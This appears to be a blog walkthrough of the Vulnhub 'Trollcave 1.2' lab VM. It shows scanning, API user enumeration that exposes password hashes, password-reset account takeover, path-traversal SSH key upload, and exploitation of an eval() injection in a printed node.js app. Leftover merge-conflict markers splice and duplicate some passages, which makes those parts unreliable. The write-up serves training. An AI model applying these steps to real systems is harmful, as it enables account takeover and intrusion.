---
layout: post
title:  "Trollcave 1.2: Vulnhub Walkthrough"
date:   2015-08-18 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine that was created by [David Yates][2], and hosted at [VulnHub][3]. The VM is a vulnerable community blog site that requires us to find any misconfigurations and use these to escalate our privileges to gain root. It a bit different as it 'avoids the more esoteric VMisms' as stated by  the author. Its different and quite interesting though. You'll definitely learn something new. Hope you enjoy.

<!--more-->
## Information Gathering

We start of with an nmap scan and get these ports open:
```
nmap -Pn -sCV -p22,80 -oN nmap/Basic_192.168.251.9.nmap 192.168.251.9
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.251.9
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Trollcave
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We'll start off with port 80:
=======
Changes13052020
We start of with an nmap scan and get these ports open: 
PORT   STATE SERVICE                                                                                                                                                  
22/tcp open  ssh                                                                                                                                                      
80/tcp open  http                                                                                                                                                     
                                                                                                                                                                      
>>>>>>> 16f31e357dc88ca176e374cb0f82fbe969f59b61

![5-1.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-1.png)

Looks like a ruby site simply based on the diammond icon. There's a list of a couple of users:

![5-2.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-2.png)


We'll do some fuzzing using wfuzz:
```
kali@kali:~/vulnhub/trollcave$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt  --hc 404 http://192.168.251.9/FUZZ                                   

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.251.9/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000035:   302        0 L      5 W      92 Ch       "admin"
000000415:   302        0 L      5 W      92 Ch       "inbox"
000000487:   200        62 L     143 W    2208 Ch     "login"
000000677:   302        0 L      5 W      87 Ch       "register"
000000685:   302        0 L      5 W      92 Ch       "reports"
000000865:   302        0 L      5 W      92 Ch       "users"

Total time: 5.512880
Processed Requests: 949
Filtered Requests: 943
Requests/sec.: 172.1423
```

![5-3.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-3.png)

To get the links on the page:

	curl -s http://192.168.251.9 | grep -Po '(href|src)=".{2,}"' | cut -d '"' -f2 | sort -u
 
 ![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)

Enumerate the users:
When we do 
```
curl -s http://192.168.251.9/users/1 
<ol class='user-blogs'><li class='blog-excerpt' id='blog-7'>
<img class="user_avatar" src="/uploads/King/crown.png" alt="Crown" width="80" height="80" />
<h1><a href="/blogs/7">Welcome to the TrollCave!</a></h1>
<div class='author'>
by
__<a href="/users/1">King</a>__
</div>
<p><p>The Trollcave is a community blogging website for people with a sense of humour. As long as you&#39;re not an idiot, we&#39;re very friendly. Registration is free, so <a href="/register">what are you waiting for</a>?...</p>
</p>
```
Thus for all users
```
kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20} | grep -v 'href\|doesn' | grep -Po 'h1>.{2,}</h1' | sort -u

h1>anybodyhome's page</h1
h1>artemus's page</h1
h1>coderguy's page</h1
h1>cooldude89's page</h1
h1>dave's page</h1
h1>dragon's page</h1
h1>Ian's page</h1
h1>kev's page</h1
h1>King's page</h1
h1>MrPotatoHead's page</h1
h1>notanother's page</h1
h1>onlyme's page</h1
h1>Q's page</h1
h1>Sir's page</h1
h1>teflon's page</h1
h1>TheDankMan's page</h1
h1>xer's page</h1
```
Another way round this is:
```
kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json

h1>xer's page</h1
kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json
{"id":1,"name":"King","email":"king@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.494Z","updated_at":"2020-05-01T06:40:12.220Z"}{"id":2,"name":"dave","email":"david@32letters.com","password":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:40:12.238Z"}{"id":3,"name":"dragon","email":"dragon@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.710Z","updated_at":"2020-05-01T06:40:12.256Z"}{"id":4,"name":"coderguy","email":"coderguy@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.805Z","updated_at":"2020-05-01T06:40:12.273Z"}{"id":5,"name":"cooldude89","email":"kewldewdeightynine@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.894Z","updated_at":"2020-05-01T06:40:12.291Z"}{"id":6,"name":"Sir","email":"sir@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.985Z","updated_at":"2020-05-01T06:40:12.310Z"}{"id":7,"name":"Q","email":"q@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.075Z","updated_at":"2020-05-01T06:40:12.331Z"}{"id":8,"name":"teflon","email":"tf@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z"}{"id":9,"name":"TheDankMan","email":"dope@dankmail.com","password":null,"created_at":"2017-10-23T09:39:42.240Z","updated_at":"2020-05-01T06:40:12.363Z"}{"id":10,"name":"artemus","email":"artemus_12145@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.318Z","updated_at":"2020-05-01T06:40:12.383Z"}{"id":11,"name":"MrPotatoHead","email":"potatoe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.395Z","updated_at":"2020-05-01T06:40:12.424Z"}{"id":12,"name":"Ian","email":"iane@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.472Z","updated_at":"2020-05-01T06:40:12.447Z"}{"id":13,"name":"kev","email":"kevin@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.548Z","updated_at":"2020-05-01T06:40:12.477Z"}{"id":14,"name":"notanother","email":"notanother@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.626Z","updated_at":"2020-05-01T06:40:12.497Z"}{"id":15,"name":"anybodyhome","email":"anybodyhome@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.702Z","updated_at":"2020-05-01T06:40:12.517Z"}{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z"}{"id":17,"name":"xer","email":"xer@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
```
We can also enumerate for the reports directory:
```
kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/reports/{1..20}.json

{"id":1,"content":"offensive comment, not even clever.","user":{"id":17,"name":"xer","email":"xer@zmail.com","password_hint":"fave pronoun","password_digest":"$2a$10$W2Y0kBt5mAae81o9yK.hSe7SG3mgVQmIXT/O13hGJlJ8qMDtxz0VG","remember_digest":null,"role":1,"hits":43,"last_seen_at":"2020-05-01T02:59:37.579Z","banned":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z","avatar_id":null,"reset_digest":null,"reset_sent_at":"2020-05-01T02:58:30.811Z"},"blog":{"id":4,"title":"Politics \u0026 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out warns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","clearance":0,"user_id":5,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"},"comment_id":2,"created_at":"2017-10-23T09:39:42.998Z","updated_at":"2017-10-23T09:39:42.998Z"}{"id":2,"content":"yellow too light to read","user":{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password_hint":"It is what it is","password_digest":"$2a$10$AEQuFMHHVaJOSYEpBLBq/.YOiybWcjWMgk7xIVGVq7E9VWzTgdl2.","remember_digest":null,"role":1,"hits":40,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":5,"title":"markdown","content":"\ngood news everybody! i've added a new feature to blogs: you can now use [markdown](https://daringfireball.net/projects/markdown/) to *format* **your** ~~posts~~.\n\nlookin forward to all the pretty new posts :)\n\t\t","clearance":1,"user_id":4,"created_at":"2017-10-23T09:39:43.012Z","updated_at":"2017-10-23T09:39:43.012Z"},"comment_id":3,"created_at":"2017-10-23T09:39:43.043Z","updated_at":"2017-10-23T09:39:43.043Z"}{"id":3,"content":"attempted hacking","user":{"id":2,"name":"dave","email":"david@32letters.com","password_hint":"nah lol","password_digest":"$2a$10$9qvAMgymdDz01DDp0yjLyeaQUWWiMjAn8T8qxLrs4eLkV6m8yZyH6","remember_digest":null,"role":4,"hits":63,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:43:15.505Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","clearance":0,"user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"},"comment_id":7,"created_at":"2017-10-23T09:39:43.144Z","updated_at":"2017-10-23T09:39:43.144Z"}{"id":4,"content":"adds nothing to discussion","user":{"id":8,"name":"teflon","email":"tf@zmail.com","password_hint":"swordfish","password_digest":"$2a$10$l1VKPrNsRN6kMAssBhGgveZ1DDFnPEZM6ZGwTvTPayvSbZPebY1B6","remember_digest":null,"role":3,"hits":34,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":8,"title":"new feature for moderators","content":"\nin order to cope with the massive growth of the site userbase, we are temporarily giving moderators the ability to appoint other moderators. this can be done through the [users](/users) page by clicking the \"mod\" link next to the user you want to promote.\n\nplease use your discretion and only appoint trustworthy, regular members. any abuse of this feature will be grounds for a swift and painful meeting with the banhammer. for both of you. \u003e:(\n\t\t","clearance":3,"user_id":4,"created_at":"2017-10-23T09:39:43.158Z","updated_at":"2017-10-23T09:39:43.158Z"},"comment_id":8,"created_at":"2017-10-23T09:39:43.193Z","updated_at":"2017-10-23T09:39:43.193Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","e
```
This contains some passwords
Once more we do the same for blog:
```
kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/blogs/{1..20}.json
                                                                                        
{"id":1,"title":"Dumb ways to die","content":"My favourite one comes from an old Viking legend called the Orkneyingers' Saga.\n \n\u003eAnd so they met and there was 
a hard battle, and not long ere Melbricta fell and his followers, and Sigurd caused the heads to be fastened to his horses’ cruppers as a glory for himself.  And then
 they rode home, and boasted of their victory.  And when they were come on the way, then Sigurd wished to spur the horse with his foot, and he struck his calf against
 the tooth which stuck out of Melbricta’s head and grazed it;  and in that wound sprung up pain and swelling, and that led him to his death.\n\nKilled by a dead guy!\
n","user_id":12,"created_at":"2017-10-23T09:39:42.887Z","updated_at":"2017-10-23T09:39:42.887Z"}{"id":2,"title":"First post","content":"\nHi, I'm Dave! I'm an adminis
trator on this site, and that makes me better than you.\n\nKneel before me, peasants!\n\n/jk\n\nbut serious, kneel\n\t\t","user_id":2,"created_at":"2017-10-23T09:39:4
2.907Z","updated_at":"2017-10-23T09:39:42.907Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"id":4,"title":"Politics \u002
6 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out wa
rns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","user_id":5
,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></htm
l>{"id":6,"title":"password reset","content":"\nso i've been getting a lot of emails lately from users who forgot their passwords and need to reset them. because the 
site doesn't have one of those 'forgot password' buttons, i've been having to do all the resets manually. i'm getting really tired of it\n\nergo it's time to implemen
t password reset. busy with this at the moment, but having trouble with site emails. you might have noticed that activation has been turned off for new users because 
of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has 
any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t","user_id":4,"created_at":"2017-10-23T09:39:43.057Z","updated_at":"2017-10-23T09:39:43.057Z"}{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
```
When reading the blog we come across a user talking about password_resets: 

```
so far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating
```
![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)

Google search tells us to reset the password we use:
http://192.168.251.9/password_resets/new

![5-5.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)

It sends the link

![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)

Note the end of the string has the parameter [name]. We'll abuse this part.
Since we already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`




Once we're logged in we go to admin panel and enable file upload 
![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-6.png)


Reading through the user King blogs we come across


This tells us we've got a user called `rails`. Attempting to upload and execute reverse shell (php or ruby) proves unfruitful.

But not all hope is lost the box is running ssh. How about uploadindg a ssh key we control via directory traversal into the home directory of rails.

../../../../../../../../home/rails/.ssh/authorized_keys

Generate a ssh key as follows

	ssh-keygen -t rsa -b 2048

Upload the key as follows:
Note we'll upload with user as xer upload as King don't work:

	ssh -i trollcave rails@192.168.251.9

We'll run LinEnum and les.

We'll use LinEnum. The user king has sudo rights  `.sudo_as_admin_successful`
```
rails@trollcave:~$ ls -lah /home/king/
total 32K
drwxr-xr-x 4 king king 4.0K Mar 21  2018 .
drwxr-xr-x 7 root root 4.0K Oct 23  2017 ..
-rw------- 1 king king   31 Mar 21  2018 .bash_history
-rw-r--r-- 1 king king  220 Sep 16  2016 .bash_logout
-rw-r--r-- 1 king king 3.7K Sep 16  2016 .bashrc
drwx------ 2 king king 4.0K Sep 16  2016 .cache
drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
-rw-r--r-- 1 king king  675 Sep 16  2016 .profile
-rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
```
<<<<<<< HEAD
He's running a program called 
```
drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc


He's running a program called  calc
```

rails@trollcave:/home/king/calc$ cat calc.js
var http = require("http");
var url = require("url");
var sys = require('sys');
var exec = require('child_process').exec;

// Start server
function start(route)
{
        function onRequest(request, response)
        {
                var theurl = url.parse(request.url);
                var pathname = theurl.pathname;
                var query = theurl.query;
                console.log("Request for " + pathname + query + " received.");
                route(pathname, request, query, response);
        }

http.createServer(onRequest).listen(8888, '127.0.0.1');
console.log("Server started");
}

// Route request
function route(pathname, request, query, response)
{
        console.log("About to route request for " + pathname);
        switch (pathname)
        {
                // security risk
                /*case "/ping":
                        pingit(pathname, request, query, response);
                        break;  */

                case "/":
                        home(pathname, request, query, response);
                        break;

                case "/calc":
                        calc(pathname, request, query, response);
                        break;

                default:
                        console.log("404");
                        display_404(pathname, request, response);
                        break;
        }
}

function home(pathname, request, query, response)
{
        response.end("<h1>The King's Calculator</h1>" +
                        "<p>Enter your calculation below:</p>" +
                        "<form action='/calc' method='get'>" +
                                "<input type='text' name='sum' value='1+1'>" +
                                "<input type='submit' value='Calculate!'>" +
                        "</form>" +
                        "<hr style='margin-top:50%'>" +
                        "<small><i>Powered by node.js</i></small>"
                        );
}

function calc(pathname, request, query, response)
{
        sum = query.split('=')[1];
        console.log(sum)
        response.writeHead(200, {"Content-Type": "text/plain"});

        response.end(eval(sum).toString());
}

function ping(pathname, request, query, response)
{
        ip = query.split('=')[1];
        console.log(ip)
        response.writeHead(200, {"Content-Type": "text/plain"});

        exec("ping -c4 " + ip, function(err, stdout, stderr) {
                response.end(stdout);
        });
}

function display_404(pathname, request, response)
{
        response.write("<h1>404 Not Found</h1>");
        response.end("I don't have that page, sorry!");
}

// Start the server and route the requests
start(route);
rails@trollcave:/home/king/calc$
```
http.createServer(onRequest).listen(8888, '127.0.0.1');
console.log("Server started"); 

Its tells us its running on 8888.
Confirmed by, 
```
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      909/ruby2.3
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      - 
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      - 
tcp6       0      0 :::22                   :::*                    LISTEN      - 
tcp6       0      0 ::1:5432                :::*                    LISTEN      - 
```

Taking a closer look at this function it uses the eval function. According this [site][5] it's advises against using the eval function as it is exploitable; we'll go ahead and exploit it 

```
function calc(pathname, request, query, response)
{
        sum = query.split('=')[1];
        console.log(sum)
        response.writeHead(200, {"Content-Type": "text/plain"});

        response.end(eval(sum).toString());
}
```
 

First we'll do some port forwarding so that we can access it on `localhost:8888`
kali@kali:~/vulnhub/trollcave$ ssh -L 8888:127.0.0.1:8888 -i trollcave rails@192.168.251.9 -f -N





When we go to calculate looks like it doesn't work. We intercept the request using Burp.

	http://localhost:8888/calc?sum=1%2B1


From function the sum parameter is converted to string then passed to eval. When we pass a string, we get the error below; 

	[object Object]

This means execution is possible. 



Hence, create a file with a reverse shell and put it in /home/rails/rs.sh. Make sure its executable and pass it as a variable to url above.
Start a listener and run it.    





We get a shell with the id as King. 
sudo -l shows he can run commands as root with no password.
Boom box done.
Then we in as root.

[1]: https://www.vulnhub.com/entry/trollcave-12,230/
[2]: https://twitter.com/@davidyat_es
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
[5]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
